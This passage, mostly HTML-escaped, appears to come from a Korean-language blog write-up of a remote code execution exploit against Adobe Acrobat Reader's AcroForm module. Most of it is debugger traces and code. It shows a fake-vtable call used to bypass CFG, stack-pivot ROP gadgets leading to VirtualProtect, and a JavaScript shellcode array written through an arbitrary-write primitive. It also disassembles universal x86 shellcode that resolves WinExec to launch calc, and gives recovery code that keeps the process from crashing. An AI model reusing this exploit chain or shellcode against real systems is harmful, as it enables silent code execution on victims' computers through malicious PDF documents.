&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa1:
63a89a41 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;0457c188&lt;/span&gt;=10c7d038
0:000&amp;gt; p
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=0c7dd54c &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63a89a44 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c170 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!hb_ot_tags_to_script_and_language+0x68fa4:
63a89a44 ffd6            call    esi {AcroForm!DllUnregisterServer+0x42ea00 (63eeaa60)}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;mov eax, [ecx]&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; ecx(&lt;code&gt;this&lt;/code&gt;)&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; Fake vtable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;(0x20000158)&amp;#xAC00; eax&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;call dword ptr [eax + 30h]&lt;/code&gt;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; Fake vtable + 0x30&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; stack pivot &amp;#xAC00;&amp;#xC82F;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;sub_20EFAA60&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; CFG &amp;#xAC80;&amp;#xC0AC;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; ROP &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=0c7dd54c &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c16c &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!DllUnregisterServer+0x42ea00:
63eeaa60 8b01            mov     eax,dword ptr [ecx]  ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;10c7d038&lt;/span&gt;=20000158
0:000&amp;gt; t
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63eeaa62 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c16c &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!DllUnregisterServer+0x42ea02:
63eeaa62 6a0d            push    0Dh
0:000&amp;gt; t
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d038 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=63eeaa64 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=0457c168 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl zr na pe cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200247
AcroForm!DllUnregisterServer+0x42ea04:
63eeaa64 ff5030          call    dword ptr [eax+30h]  ds:002b:&lt;span class=&#34;hljs-attribute&#34;&gt;20000188&lt;/span&gt;=63a46984
0:000&amp;gt; u 63a46984
AcroForm!hb_ot_tags_to_script_and_language+0x25ee4:
63a46984 8be0            mov     esp,eax
63a46986 ffc9            dec     ecx
63a46988 c3              ret&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xAC00;&amp;#xC82F;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74; eax(&lt;code&gt;arrBufPtr + 0x100&lt;/code&gt;)&amp;#xAC12;&amp;#xC744; esp&amp;#xC5D0; &amp;#xC4F0;&amp;#xBA74;&amp;#xC11C; stack pivot&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xACE0; &lt;code&gt;ret&lt;/code&gt;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xB370; &amp;#xC774;&amp;#xB54C;&amp;#xC758; esp&amp;#xC778; 0x20000158&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xB610; &amp;#xB2E4;&amp;#xB978; stack pivot &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d037 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6380e646 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=2000015c &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na po cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200203
AcroForm+0x1e646:
6380e646 5c              pop     esp
0:000&amp;gt; t
&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=20000158 &lt;span class=&#34;hljs-attribute&#34;&gt;ebx&lt;/span&gt;=00000001 &lt;span class=&#34;hljs-attribute&#34;&gt;ecx&lt;/span&gt;=10c7d037 &lt;span class=&#34;hljs-attribute&#34;&gt;edx&lt;/span&gt;=00005000 &lt;span class=&#34;hljs-attribute&#34;&gt;esi&lt;/span&gt;=63eeaa60 &lt;span class=&#34;hljs-attribute&#34;&gt;edi&lt;/span&gt;=63a89990
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=6380e647 &lt;span class=&#34;hljs-attribute&#34;&gt;esp&lt;/span&gt;=20000358 &lt;span class=&#34;hljs-attribute&#34;&gt;ebp&lt;/span&gt;=0457c19c &lt;span class=&#34;hljs-attribute&#34;&gt;iopl&lt;/span&gt;=0         nv up ei pl nz na po cy
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=0023  &lt;span class=&#34;hljs-attribute&#34;&gt;ss&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;ds&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;es&lt;/span&gt;=002b  &lt;span class=&#34;hljs-attribute&#34;&gt;fs&lt;/span&gt;=0053  &lt;span class=&#34;hljs-attribute&#34;&gt;gs&lt;/span&gt;=002b             &lt;span class=&#34;hljs-attribute&#34;&gt;efl&lt;/span&gt;=00200203
AcroForm+0x1e647:
6380e647 c3              ret
0:000&amp;gt; dd esp
20000358  757d0760 20000458 20000458 00001000
20000368  00000040 20000598 00000000 00000000&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; esp&amp;#xB294; 0x20000358&amp;#xB85C; &amp;#xBC14;&amp;#xB00C;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xD55C;&amp;#xBC88; &amp;#xB354; &lt;code&gt;ret&lt;/code&gt;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;KERNEL32!VirtualProtectStub&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; eip&amp;#xAC00; &amp;#xBCC0;&amp;#xACBD;&amp;#xB418;&amp;#xACE0; pivot&amp;#xB41C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; &amp;#xC778;&amp;#xC790;&amp;#xB4E4;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &lt;code&gt;VirtualProtect(0x20000458, 0x1000, PAGE_EXECUTE_READWRITE, 0x20000598)&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xD6A8;&amp;#xACFC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;6-Insert-Shellcode&#34;&gt;&lt;a href=&#34;#6-Insert-Shellcode&#34; class=&#34;headerlink&#34; title=&#34;6. Insert Shellcode&#34;&gt;&lt;/a&gt;6. Insert Shellcode&lt;/h2&gt;&lt;p&gt;&amp;#xC0BD;&amp;#xC785;&amp;#xB41C; ROP &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xC2E4;&amp;#xD589; &amp;#xAD8C;&amp;#xD55C;&amp;#xC774; &amp;#xBD80;&amp;#xC5EC;&amp;#xB41C; 0x20000458&amp;#xB85C; &amp;#xB9AC;&amp;#xD134;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; shellcode&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; shellcode = [
    &lt;span class=&#34;hljs-comment&#34;&gt;// recovery prefix       (store reg context)&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;// 0x909090CC,&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x89e083e8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x18535256&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x57505590&lt;/span&gt;,

    &lt;span class=&#34;hljs-comment&#34;&gt;// shellcode&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;835867240&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1667329123&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1415139921&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1686860336&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2339769483&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1980542347&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;814448152&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2338274443&lt;/span&gt;,
    &lt;span class=&#34;hljs-number&#34;&gt;1545566347&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1948196865&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4270543903&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;605009708&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;390218413&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2168194903&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1768834421&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4035671071&lt;/span&gt;,
    &lt;span class=&#34;hljs-number&#34;&gt;469892611&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1018101719&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2425393296&lt;/span&gt;,

    &lt;span class=&#34;hljs-comment&#34;&gt;// recovery suffix&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;// 0x909090CC,&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;/*restore regs*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x58585d58&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/*restore vtable*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x8b48608b&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x50648911&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/*pop regs*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x5f5e5a5b&lt;/span&gt;,
    &lt;span class=&#34;hljs-comment&#34;&gt;/*restore ebp,esp: 0x89ea83ea, 0x3089d490, */&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x89ec83ec&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x30909090&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/* esi = fn*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x8b706890&lt;/span&gt;,
    &lt;span class=&#34;hljs-comment&#34;&gt;/*arrbuf restore*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x53bb4000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x00208b50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x6cc7430c&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe8ff0000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xc74220e8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xff000090&lt;/span&gt;,
    &lt;span class=&#34;hljs-number&#34;&gt;0x8953108b&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x50708913&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x8b507489&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x530431d2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x5b909090&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;/*jmp esi*/&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xffe69090&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;/*jmp defaultVal 0xff606890*/&lt;/span&gt;
];

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; shellcode.length; i++) AAW(arrBufPtr + &lt;span class=&#34;hljs-number&#34;&gt;0x400&lt;/span&gt; + i * &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, re(shellcode[i]));&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC0BD;&amp;#xC785;&amp;#xB41C; shellcode&amp;#xB97C; &amp;#xB514;&amp;#xC2A4;&amp;#xC5B4;&amp;#xC148;&amp;#xBE14;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;89e0           mov     eax, esp
83e818         sub     eax, 18h
53             push    ebx
52             push    edx
56             push    esi
57             push    edi
50             push    eax
55             push    ebp
90             nop     
31d2           xor     edx, edx
52             push    edx; 0
6863616c63     push    636C6163h; &amp;quot;calc&amp;quot;
54             push    esp
59             pop     ecx
52             push    edx
51             push    ecx
648b7230       mov     esi, dword ptr fs:[edx+30h]; PEB
8b760c         mov     esi, dword ptr [esi+0Ch]; PEB_LDR_DATA
8b760c         mov     esi, dword ptr [esi+0Ch]; InLoadOrderModuleList
ad             lods    dword ptr [esi]; eax &amp;lt;- AcroRd32.exe&amp;apos;s _LDR_DATA_TABLE_ENTRY
8b30           mov     esi, dword ptr [eax]; esi &amp;lt;- KERNEL32.dll&amp;apos;s _LDR_DATA_TABLE_ENTRY
8b7e18         mov     edi, dword ptr [esi+18h]; edi &amp;lt;- KERNEL32 dll base
8b5f3c         mov     ebx, dword ptr [edi+3Ch]; ebx &amp;lt;- PE Headaer Offset
8b5c1f78       mov     ebx, dword ptr [edi+ebx+78h]; ebx &amp;lt;- Export Table Offset
8b741f20       mov     esi, dword ptr [edi+ebx+20h]; esi &amp;lt;- Name Pointer Table offset
01fe           add     esi, edi; add KERNEL32 base to esi(Name Pointer Table addr)
8b541f24       mov     edx, dword ptr [edi+ebx+24h]; edx &amp;lt;- Ordinal Table Offset
0fb72c17       movzx   ebp, word ptr [edi+edx]; ebp &amp;lt;- Ordinal Number
42             inc     edx
42             inc     edx; move to next
ad             lods    dword ptr [esi]; Function name offset
813c0757696e45 cmp     dword ptr [edi+eax], 456E6957h; compare Function_Name with &amp;quot;WinE&amp;quot;
75f0           jne     20000491; if WinExec Found, no jump
8b741f1c       mov     esi, dword ptr [edi+ebx+1Ch]; esi &amp;lt;- Address Table Offset
01fe           add     esi, edi; esi &amp;lt;- Address Table addr
033cae         add     edi, dword ptr [esi+ebp*4]; edi &amp;lt;- edi(KERNEL32 base) + WinExec Offset
ffd7           call    edi; WinExec(&amp;quot;calc&amp;quot;, 0)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB294; &lt;code&gt;WinExec(&amp;quot;calc&amp;quot;, 0)&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; Windows x86 &amp;#xB300;&amp;#xC0C1; Universal Shellcode&amp;#xB85C; &amp;#xACC4;&amp;#xC0B0;&amp;#xAE30; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; RCE &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC99D;&amp;#xBA85;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;WinExec&lt;/code&gt;&amp;#xAC00; &amp;#xB9AC;&amp;#xD134;&amp;#xD55C; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740; shellcode&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xC5B4; shellcode&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xB97C; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; length, &lt;code&gt;f0&lt;/code&gt;&amp;#xC758; vtable &amp;#xC8FC;&amp;#xC18C;,  pivot&amp;#xB41C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xB4F1;&amp;#xC744; &amp;#xBCF5;&amp;#xC6D0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xC0AC;&amp;#xC804;&amp;#xC5D0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xB454; &lt;code&gt;defaultValue&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &lt;code&gt;jmp&lt;/code&gt;&amp;#xD558;&amp;#xC5EC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC774; &amp;#xC131;&amp;#xACF5;&amp;#xD55C; &amp;#xD6C4;&amp;#xC5D0;&amp;#xB3C4; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;200004b0 58             pop     eax
200004b1 58             pop     eax
200004b2 5d             pop     ebp
200004b3 58             pop     eax
200004b4 8b4860         mov     ecx, dword ptr [eax+60h]
200004b7 8b5064         mov     edx, dword ptr [eax+64h]
200004ba 8911           mov     dword ptr [ecx], edx
200004bc 5f             pop     edi
200004bd 5e             pop     esi
200004be 5a             pop     edx
200004bf 5b             pop     ebx
200004c0 89ec           mov     esp, ebp
200004c2 83ec30         sub     esp, 30h
200004c5 90             nop     
200004c6 90             nop     
200004c7 90             nop     
200004c8 8b7068         mov     esi, dword ptr [eax+68h]
200004cb 90             nop     
200004cc 53             push    ebx
200004cd bb40000020     mov     ebx, 20000040h
200004d2 8b506c         mov     edx, dword ptr [eax+6Ch]
200004d5 c7430ce8ff0000 mov     dword ptr [ebx+0Ch], 0FFE8h
200004dc c74220e8ff0000 mov     dword ptr [edx+20h], 0FFE8h
200004e3 90             nop     
200004e4 895310         mov     dword ptr [ebx+10h], edx
200004e7 8b5070         mov     edx, dword ptr [eax+70h]
200004ea 8913           mov     dword ptr [ebx], edx
